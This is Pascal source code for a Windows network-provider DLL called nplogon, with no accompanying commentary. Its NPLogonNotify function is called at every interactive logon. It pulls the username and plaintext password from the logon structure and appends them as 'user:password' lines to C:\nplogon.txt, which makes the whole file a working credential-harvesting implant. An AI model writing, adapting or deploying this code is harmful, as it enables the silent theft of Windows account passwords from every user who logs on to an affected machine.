library nplogon;

{$mode objfpc}{$H+}

uses
  sysutils,windows;
  { you can add units after this }

type
UNICODE_STRING = record
  Length: USHORT;
  MaximumLength: USHORT;
  {$ifdef CPU64}dummy:dword;{$endif cpu64}
  Buffer: PWIDECHAR;
end;


type
 MSV1_0_LOGON_SUBMIT_TYPE=(
	MsV1_0InteractiveLogon = 2,
	MsV1_0Lm20Logon,
	MsV1_0NetworkLogon,
	MsV1_0SubAuthLogon,
	MsV1_0WorkstationUnlockLogon = 7,
	MsV1_0S4ULogon = 12,
	MsV1_0VirtualLogon = 82,
	MsV1_0NoElevationLogon = 83,
	MsV1_0LuidLogon = 84);

type  _MSV1_0_INTERACTIVE_LOGON=record
	MessageType:MSV1_0_LOGON_SUBMIT_TYPE;
	LogonDomainName:UNICODE_STRING;
	UserName:UNICODE_STRING;
	Password:UNICODE_STRING;
end;
PMSV1_0_INTERACTIVE_LOGON=^_MSV1_0_INTERACTIVE_LOGON;

const
 WNNC_SPEC_VERSION=                $00000001;
 WNNC_SPEC_VERSION51=              $00050001;
 WNNC_NET_TYPE=                    $00000002;
 WNNC_START=                       $0000000C;
 WNNC_WAIT_FOR_START=              $00000001;
 WNNC_CRED_MANAGER=                $FFFF0000;

 procedure logfile(s:string;l:ushort=0);
 var
    	 hFile:HANDLE;
 	 dwWritten:DWORD;
         l_:ushort;
 begin

 	hFile := CreateFile('C:\nplogon.txt',
 		GENERIC_WRITE,
 		0,
 		nil,
 		OPEN_ALWAYS,
 		FILE_ATTRIBUTE_NORMAL,
 		0);

 	if (hFile <> INVALID_HANDLE_VALUE) then
 	begin
 		SetFilePointer(hFile, 0, nil, FILE_END);
                if l>0 then l_:=l else l_:=length(s);
                WriteFile(hfile,s[1],l_,dwWritten,nil);
 		CloseHandle(hFile);
 	end;
end;


function NPGetCaps(nIndex:dword):dword;stdcall;
begin
        //logfile('NPGetCaps'#13#10);
	case (nIndex) of

		 WNNC_SPEC_VERSION:
			result:= WNNC_SPEC_VERSION51;

		 WNNC_NET_TYPE:
			result:= WNNC_CRED_MANAGER;

		 WNNC_START:
			result:= WNNC_WAIT_FOR_START;

		else result:= 0;
                end;
end;


function NPLogonNotify(
	lpLogonId:PLUID;
	lpAuthInfoType:LPCWSTR;
	lpAuthInfo:LPVOID;
	lpPrevAuthInfoType:LPCWSTR;
	lpPrevAuthInfo:LPVOID;
	lpStationName:LPWSTR;
	StationHandle:LPVOID;
	lpLogonScript:pointer):dword;stdcall;
const
 crlf=#13#10;
begin
        //logfile('NPLogonNotify'#13#10);
        OutputDebugStringW  (pwidechar(_MSV1_0_INTERACTIVE_LOGON (lpAuthInfo^).UserName.Buffer ));
        logfile(strpas(pwidechar(_MSV1_0_INTERACTIVE_LOGON (lpAuthInfo^).UserName.Buffer)),_MSV1_0_INTERACTIVE_LOGON (lpAuthInfo^).UserName.Length div 2 );
        logfile(':');
        logfile(strpas(pwidechar(_MSV1_0_INTERACTIVE_LOGON (lpAuthInfo^).password.Buffer)),_MSV1_0_INTERACTIVE_LOGON (lpAuthInfo^).Password.Length div 2 );
        logfile(crlf);
	lpLogonScript := nil;
	result:= WN_SUCCESS;
end;

exports NPGetCaps index 1, NPLogonNotify index 2;

begin
  //logfile('nplogon'#13#10);
end.
